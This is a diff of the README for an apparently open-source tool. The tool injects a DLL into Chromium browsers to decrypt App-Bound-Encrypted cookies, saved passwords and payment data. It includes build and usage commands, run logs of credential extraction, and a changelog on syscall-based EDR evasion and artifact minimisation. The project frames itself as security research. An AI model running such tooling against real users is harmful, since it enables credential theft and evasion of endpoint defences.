@@ -1,6 +1,6 @@
 # Chrome App-Bound Encryption Decryption
 
-## 🔍 Overview
+## 🚀 Overview
 
 Fully decrypt **App-Bound Encrypted (ABE)** cookies, passwords & payment methods from Chromium-based browsers (Chrome, Brave, Edge) — all in user mode, no admin rights required.
 
@@ -9,7 +9,7 @@ If you find this useful, I’d appreciate a coffee:
 
 ## 🛡️ Background
 
-Starting in **Chrome 127+**, Google added App-Bound Encryption to strengthen local data:
+Starting in **Chrome 127+**, Google began rolling out **App-Bound Encryption** to secure local user data:
 
 1. **Key generation**: a per-profile AES-256-GCM key is created and wrapped by Windows DPAPI.
 2. **Storage**: that wrapped key (Base64-encoded, prefixed with `APPB`) lands in your **Local State** file.
@@ -17,13 +17,19 @@ Starting in **Chrome 127+**, Google added App-Bound Encryption to strengthen loc
 
 These path-validation checks prevent any external tool — even with direct DPAPI access — from unwrapping the ABE key.
 
-## 🚀 How It Works
+## 💡 Project Philosophy & Disclaimer
+
+> [!IMPORTANT]
+> This is a hobby project created for educational and security research purposes. It serves as a personal learning experience and a playing field for exploring advanced Windows concepts.
+>
+> **This tool is NOT intended to be a fully-featured infostealer or a guaranteed EDR evasion tool.** While it employs advanced techniques, its primary goal is to demonstrate and dissect the ABE mechanism, not to provide operational stealth for malicious use. Please ensure compliance with all relevant legal and ethical guidelines.
+
+## 🛠️ How It Works
 
 **This project** injects a DLL into the running browser process using **Reflective DLL Injection (RDI)**. The RDI technique for x64 is based on [Stephen Fewer's original work](https://github.com/stephenfewer/ReflectiveDLLInjection), and for ARM64, it utilizes my method detailed in [ARM64-ReflectiveDLLInjection](https://github.com/xaitax/ARM64-ReflectiveDLLInjection). Once injected, the DLL:
 
-- **Runs from inside** the browser’s address space (satisfies IElevator’s install-folder check)
-- **Invokes** the IElevator COM interface directly to unwrap the ABE key
-- **Uses** that key to decrypt cookies, passwords, and payment data - all in user land, no elevation needed
+1.  **Stealthy Injector (`chrome_inject.exe`):** Employs an advanced, multi-architecture **direct syscall** engine to execute a fileless, in-memory injection of the payload. This method avoids high-level WinAPI calls, minimizing its signature for EDR products.
+2.  **Reflective Payload (`chrome_decrypt.dll`):** Once in the target's address space, it uses **Reflective DLL Injection (RDI)** to properly load itself into memory. It then invokes the `IElevator` COM interface to unwrap the ABE key and decrypt all sensitive data in user land, no elevation needed.
 
 ## 🔬 In-Depth Technical Analysis & Research
 
@@ -60,7 +66,7 @@ For a comprehensive understanding of Chrome's App-Bound Encryption, the intricac
 - 🔓 Full user-mode decryption & JSON export of cookies, passwords & payment methods
 - 📁 Customizable output directory for extracted data (`.\output\` by default)
 - 👥 Support for multiple browser profiles (Default, Profile 1, Profile 2, etc.)
-- 🚧 Stealthy Reflective DLL Injection to bypass path checks & common endpoint defenses
+- 🛡️ Advanced direct syscall injection engine to bypass common endpoint defenses
 - 🌐 Works on **Google Chrome**, **Brave** & **Edge** (x64 & ARM64)
 - 🛠️ No admin privileges required
 
@@ -70,9 +76,9 @@ For a comprehensive understanding of Chrome's App-Bound Encryption, the intricac
 
 | Browser            | Tested Version (x64 & ARM64) |
 | ------------------ | ---------------------------- |
-| **Google Chrome**  | 137.0.7151.56                |
-| **Brave**          | 1.78.102 (136.0.7103.113)    |
-| **Microsoft Edge** | 137.0.3296.52                |
+| **Google Chrome**  | 137.0.7151.104               |
+| **Brave**          | 1.79.123 (137.0.7151.104)    |
+| **Microsoft Edge** | 138.0.3351.21                |
 
 > [!NOTE]  
 > The injector requires the target browser to be **running** unless you use `--start-browser`.
@@ -103,7 +109,7 @@ For a comprehensive understanding of Chrome's App-Bound Encryption, the intricac
 4. **Compile the injector** (responsible for DLL injection & console UX):
 
    ```bash
-   cl /EHsc /O2 /std:c++17 /MT src\chrome_inject.cpp version.lib shell32.lib /link /OUT:chrome_inject.exe
+   cl /EHsc /O2 /std:c++17 /MT src\chrome_inject.cpp src\syscalls.cpp version.lib shell32.lib /link /OUT:chrome_inject.exe
    ```
 
 Both artifacts (`chrome_inject.exe`, `chrome_decrypt.dll`) must reside in the same folder.
@@ -112,9 +118,7 @@ Both artifacts (`chrome_inject.exe`, `chrome_decrypt.dll`) must reside in the sa
 
 This project uses GitHub Actions to automatically build `chrome_inject.exe` and `chrome_decrypt.dll` for both **x64** and **ARM64** architectures.
 
-Each architecture-specific ZIP (e.g., `chrome-decryptor-0.10.0-x64.zip`) will contain `chrome_inject_ARCH.exe` (e.g., `chrome_inject_x64.exe`) and the corresponding architecture-specific `chrome_decrypt.dll`.
-
-You can find pre-compiled binaries attached to the [Releases page](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases) of this repository.
+You can find the latest pre-compiled binaries attached to the [**Releases page**](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases) of this repository.
 
 ## 🚀 Usage
 
@@ -143,29 +147,26 @@ Options
 ### Examples
 
 ```bash
-# Standard load-library injection:
+# Standard injection into a running Chrome process:
 PS> .\chrome_inject.exe chrome
 
-# Auto-start Brave and show debug logs:
-PS> .\chrome_inject.exe --method load --start-browser --verbose brave
+# Auto-start Brave and show verbose debug logs:
+PS> .\chrome_inject.exe --start-browser --verbose brave
 ```
 
 #### Normal Run
 
 ```bash
-PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption>chrome_inject.exe chrome --start-browser
+PS> .\chrome_inject.exe --start-browser chrome
 ------------------------------------------------
 |  Chrome App-Bound Encryption Decryption      |
-|  Reflective DLL Process Injection            |
-|  Cookies / Passwords / Payment Methods       |
-|  v0.10.0 by @xaitax                          |
+|  Direct Syscall Injection Engine             |
+|  x64 & ARM64 | Cookies, Passwords, Payments  |
+|  v0.11.0 by @xaitax                          |
 ------------------------------------------------
 
-[*] Chrome not running, launching...
-[+] Chrome (v. 137.0.7151.56) launched w/ PID 18900
-[+] DLL injected via Reflective DLL Injection (RDI)
-[*] Waiting for DLL decryption tasks to complete (max 60s)...
-[+] DLL signaled completion.
+[+] DLL injected via Reflective DLL Injection (RDI with Syscalls)
+[*] Waiting for DLL (Pipe: \\.\pipe\ChromeDecryptIPC_9c71c588-e69d-4b59-ba30-1d6303c2eaba
 
 [+] COM library initialized (APARTMENTTHREADED).
 [+] Attempting to read Local State file: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
@@ -184,75 +185,66 @@ PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption>chrome_in
      [*] 1 Passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\passwords.txt
      [*] 1 Payment methods extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\payments.txt
 [*] Processing profile: Profile 1 at path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Profile 1
-     [*] 32 Cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.txt
+     [*] 136 Cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.txt
 [*] Chrome data decryption process finished for Chrome.
-[*] Unloading DLL and exiting worker thread.
+[+] DLL signaled completion or pipe interaction ended.
 ```
 
 #### Verbose
 
 ```bash
-PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome_inject.exe chrome --start-browser --verbose
+PS> .\chrome_inject.exe --verbose --start-browser chrome
 ------------------------------------------------
 |  Chrome App-Bound Encryption Decryption      |
-|  Reflective DLL Process Injection            |
-|  Cookies / Passwords / Payment Methods       |
-|  v0.10.0 by @xaitax                          |
+|  Direct Syscall Injection Engine             |
+|  x64 & ARM64 | Cookies, Passwords, Payments  |
+|  v0.11.0 by @xaitax                          |
 ------------------------------------------------
 
+[#] [Syscalls] Found and sorted 489 Zw* functions.
+[#] [Syscalls] Successfully initialized all syscall stubs via Tartarus Gate.
+[#] [Syscalls]   - NtAllocateVirtualMemory found at 140734625681808
 [#] Verbose mode enabled.
+[#] Auto-start browser enabled.
+[#] Browser type argument: chrome
 [#] CleanupPreviousRun: attempting to remove temp files
-[#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_decrypt.log
 [#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
 [#] Resolved output path: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output
-[#] Writing session config to: C:\Users\ah\AppData\Local\Temp\chrome_decrypt_session.cfg
-[#] HandleGuard: acquired handle 0xb0 (CompletionEvent)
-[#] Created completion event: Global\ChromeDecryptWorkDoneEvent
 [#] Target: Chrome, Process: chrome.exe, Default Exe: C:\Program Files\Google\Chrome\Application\chrome.exe
 [#] GetProcessIdByName: snapshotting processes for chrome.exe
-[#] HandleGuard: acquired handle 0xb4 (CreateToolhelp32Snapshot)
-[#] GetProcessIdByName: Process chrome.exe not found.
-[#] HandleGuard: closing handle 0xb4 (CreateToolhelp32Snapshot)
-[*] Chrome not running, launching...
-[#] StartBrowserAndWait: attempting to launch: C:\Program Files\Google\Chrome\Application\chrome.exe
-[#] HandleGuard: acquired handle 0xd8 (BrowserProcessHandle)
-[#] HandleGuard: acquired handle 0xd4 (BrowserMainThreadHandle)
-[#] Waiting 3s for browser to initialize...
-[#] Browser started PID=5420
-[#] HandleGuard: closing handle 0xd4 (BrowserMainThreadHandle)
-[#] HandleGuard: closing handle 0xd8 (BrowserProcessHandle)
-[#] Retrieving version info for: C:\Program Files\Google\Chrome\Application\chrome.exe
-[#] Version query successful: 137.0.7151.56
-[+] Chrome (v. 137.0.7151.56) launched w/ PID 5420
-[#] Opening process PID=5420
-[#] HandleGuard: acquired handle 0xd8 (TargetProcessHandle)
+[#] HandleGuard: acquired handle 0xdc (CreateToolhelp32Snapshot)
+[#] Found process chrome.exe PID=8720
+[#] HandleGuard: closing handle 0xdc (CreateToolhelp32Snapshot)
+[#] Opening process PID=8720
+[#] HandleGuard: acquired handle 0xdc (TargetProcessHandle)
 [#] IsWow64Process2: processMachine=Unknown, nativeMachine=ARM64, effectiveArch=ARM64
 [#] IsWow64Process2: processMachine=Unknown, nativeMachine=ARM64, effectiveArch=ARM64
 [#] Architecture match: Injector=ARM64, Target=ARM64
+[#] Memory for pipe name allocated in target at 0x1d7825f0000
+[#] Pipe name written to target memory.
 [#] GetPayloadDllPathUtf8: DLL path determined as: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
-[#] InjectWithReflectiveLoader: begin for DLL: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
-[#] RDI: DLL read into local buffer. Size: 1405440 bytes.
-[#] RDI: ReflectiveLoader file offset: 0x18f38
-[#] RDI: Memory allocated in target at 0x167ae180000 (Size: 1405440 bytes)
+[#] InjectWithReflectiveLoader: begin for DLL: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll, Param: 0x1d7825f0000
+[#] RDI: DLL read into local buffer. Size: 1400320 bytes.
+[#] RDI: ReflectiveLoader file offset: 0x18b90
+[#] RDI: Memory allocated in target at 0x1d782e50000 (Size: 1400320 bytes)
 [#] RDI: DLL written to target memory.
-[#] RDI: Calculated remote ReflectiveLoader address: 0x167ae198f38
-[#] HandleGuard: acquired handle 0xec (RemoteReflectiveLoaderThread)
+[#] RDI: Calculated remote ReflectiveLoader address: 0x1d782e68b90
+[#] HandleGuard: reset to handle 0xe0
 [#] RDI: Waiting for remote ReflectiveLoader thread to complete (max 15s)...
-[#] RDI: Remote thread exit code: 0xae2e0000
+[#] RDI: Remote thread exit code: 0x82fb0000
 [#] RDI: Remote ReflectiveLoader thread finished.
 [#] InjectWithReflectiveLoader: done
-[#] HandleGuard: closing handle 0xec (RemoteReflectiveLoaderThread)
-[+] DLL injected via Reflective DLL Injection (RDI)
-[*] Waiting for DLL decryption tasks to complete (max 60s)...
-[+] DLL signaled completion.
-[#] Attempting to display log file: C:\Users\ah\AppData\Local\Temp\chrome_decrypt.log
+[#] HandleGuard: closing handle 0xe0 (RemoteReflectiveLoaderThread_Syscall)
+[+] DLL injected via Reflective DLL Injection (RDI with Syscalls)
+[#] Waiting for DLL to connect to named pipe: \\.\pipe\ChromeDecryptIPC_6f6a66c2-6712-49ad-9c98-d3701e8f2d61
+[#] DLL connected to named pipe.
+[#] Verbose status (VERBOSE_TRUE) sent to DLL.
+[#] Output path sent to DLL: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output
+[*] Waiting for DLL (Pipe: \\.\pipe\ChromeDecryptIPC_6f6a66c2-6712-49ad-9c98-d3701e8f2d61
 
-[+] Terminated process: ID 14876 (chrome.exe)
-[+] Terminated process: ID 25540 (chrome.exe)
-[+] Terminated process: ID 28300 (chrome.exe)
-[+] Terminated process: ID 3008 (chrome.exe)
-[+] Terminated process: ID 10540 (chrome.exe)
-[+] Terminated process: ID 15632 (chrome.exe)
+[+] Terminated process: ID 19772 (chrome.exe)
+[+] Terminated process: ID 4048 (chrome.exe)
+[+] Terminated process: ID 12188 (chrome.exe)
 [+] COM library initialized (APARTMENTTHREADED).
 [+] Attempting to read Local State file: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
 [+] Encrypted key header is valid.
@@ -270,16 +262,15 @@ PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome
      [*] 1 Passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\passwords.txt
      [*] 1 Payment methods extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\payments.txt
 [*] Processing profile: Profile 1 at path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Profile 1
-     [*] 32 Cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.txt
+     [*] 136 Cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.txt
 [*] Chrome data decryption process finished for Chrome.
-[*] Unloading DLL and exiting worker thread.
-[#] Terminating browser PID=5420 because injector started it.
-[#] HandleGuard: acquired handle 0xec (ProcessToKillHandle)
-[*] Chrome terminated by injector.
-[#] HandleGuard: closing handle 0xec (ProcessToKillHandle)
+[#] DLL completion signal received via pipe.
+[+] DLL signaled completion or pipe interaction ended.
+[#] Freed pipe name memory in target process.
+[#] Browser was already running; injector will not terminate it.
 [#] Injector finished.
-[#] HandleGuard: closing handle 0xd8 (TargetProcessHandle)
-[#] HandleGuard: closing handle 0xb0 (CompletionEvent)
+[#] HandleGuard: closing handle 0xdc (TargetProcessHandle)
+[#] HandleGuard: closing handle 0xd4 (NamedPipeServer)
 ```
 
 ## 📂 Data Extraction
@@ -359,38 +350,14 @@ Each payment file is a JSON array of objects:
 ]
 ```
 
-## ⚠️ Potential Issues & Errors
-
-### `DecryptData failed. HRESULT: 0x8004a003. Last COM Error: 8009000b. Decrypted BSTR is null.`
-
-If you encounter this error message from the DLL's log output, it indicates a failure within Chrome's internal decryption mechanism, specifically when calling the `IElevator::DecryptData` COM method.
-
-Let's break down the error codes:
-
-*   **`HRESULT: 0x8004a003`**: This is the COM error code `EPT_S_NOT_REGISTERED`. It typically means that a necessary RPC (Remote Procedure Call) endpoint that the `IElevator` COM object relies upon could not be found, was not registered, or there was an issue with inter-process communication. This could be a primary cause or a contributing factor preventing the `IElevator` object from functioning correctly.
-*   **`Last COM Error: 0x8009000b`** (hexadecimal for `2148073483`): This is the Windows Cryptography API error `NTE_BAD_KEY_STATE` (“Key not valid for use in specified state”). This means DPAPI (the Windows Data Protection API) couldn’t decrypt the wrapped AES-GCM key stored in Chrome’s `Local State` file. The key was likely inaccessible or considered invalid *from the context or state in which the `IElevator` object was trying to use it*.
-
-The `EPT_S_NOT_REGISTERED` error might prevent the `IElevator` from establishing the correct operational context or from communicating with other necessary Chrome components, which in turn leads to the `NTE_BAD_KEY_STATE` when it attempts the actual cryptographic decryption.
-
-#### Common Causes
-Many of these relate to the conditions required for DPAPI to successfully operate:
-
-*   When you change your Windows logon password, Windows re-wraps your DPAPI master key under the new password. If the old key can’t be decrypted (e.g., because the system wasn't properly online to sync, or a cached credential issue), any older data blobs protected by it might fail to decrypt until a successful re-encryption cycle.
-*   DPAPI keys are tied to a specific user profile on a specific machine. Attempting to decrypt data from a Chrome profile copied from another user account or another computer will fail.
-*   If you run the injector as **Administrator** (or as the `SYSTEM` account) targeting a Chrome process running as a standard, non-elevated user, DPAPI will likely refuse the decryption. The security context for decryption must match that of the user who originally encrypted the data. The `IElevator` object itself has specific context requirements.
-*   The user's DPAPI master keys are stored in `%APPDATA%\Microsoft\Protect\{SID}` (where `{SID}` is the user's Security Identifier). If this folder is missing, corrupted, or its permissions are incorrect, DPAPI cannot access the necessary keys.
-*   The `IElevator` COM interface and its underlying RPC mechanisms are internal to Chrome. Google can modify their behavior, requirements, or even how they are registered with any Chrome update. This tool might be incompatible with the specific Chrome version you are targeting.
-*   Antivirus, EDR (Endpoint Detection and Response), or other security software might be interfering with the COM/RPC communications, the DLL's ability to interact with `IElevator`, or its access to cryptographic functions and resources.
-
-#### Work-around / Notes
-*   Ensure the injector is run from the *same interactive user account* that owns the Chrome profile and at the *same privilege level* as the target Chrome processes (usually non-elevated).
-*   After a Windows password change, logging off and back on can help ensure DPAPI has correctly re-synchronized and re-encrypted necessary keys.
-*   Ensure the Chrome profile folder (`%LOCALAPPDATA%\Google\Chrome\User Data\`) has not been moved, restored from a backup from another system/user, or had its DPAPI-related files tampered with.
-*   The tool's success can be highly dependent on the Chrome version. Check if this tool version is known to work with your installed Chrome version.
-*   To rule out interference, you might *temporarily* disable security software. Re-enable it immediately after testing.
-*   Chrome has an internal recovery mechanism (`IElevator::RunRecoveryCRXElevated(...)`) that can re-wrap keys if DPAPI fails, but not implemented by this tool to avoid providing an easy bypass for malware.
-
 ## 🆕 Changelog
+
+### v0.11
+- **Kernel-Level Execution Syscall Engine (Halo's & Tartarus Gate Fusion)**: Implemented a multi-architecture syscall resolution system for improved stealth. This hybrid engine combines the strengths of multiple modern techniques:
+  - The injector first attempts a [Halo's Gate](https://blog.sektor7.net/#!res/2021/halosgate.md) approach by dynamically calculating the required System Service Numbers (SSNs) and hunting for clean, unhooked syscall stubs within ntdll.dll.
+  - In heavily monitored environments where no clean stubs can be found (as discovered on Windows on ARM64 installations), the system automatically pivots to a [Tartarus Gate](https://github.com/trickster0/TartarusGate) methodology. It directly leverages the function pointers of the (potentially hooked) Zw functions, ensuring execution continuity by passing through the EDR's hooks to the kernel.
+  - This dual-pronged strategy provides maximum stealth and operational resilience across diverse target environments on both x64 and ARM64.
+- **Stealth Enhancement (IPC)**: Transitioned from file-based IPC to **Named Pipes** for configuration and logging. `chrome_inject.exe` (server) passes a unique pipe name to the target's remote memory. `chrome_decrypt.dll` (client) uses this pipe for receiving output path configuration and for streaming log data/completion signals directly to the injector, minimizing on-disk artifacts and eliminating global named event usage.
 
 ### v0.10
 - **Refactor**: Switched to **Reflective DLL Injection (RDI)** as the sole injection method, removing older `LoadLibrary` and `NtCreateThreadEx` options for enhanced stealth. (x64 RDI based on [Stephen Fewer's work](https://github.com/stephenfewer/ReflectiveDLLInjection), ARM64 RDI based on [xaitax/ARM64-ReflectiveDLLInjection](https://github.com/xaitax/ARM64-ReflectiveDLLInjection)).
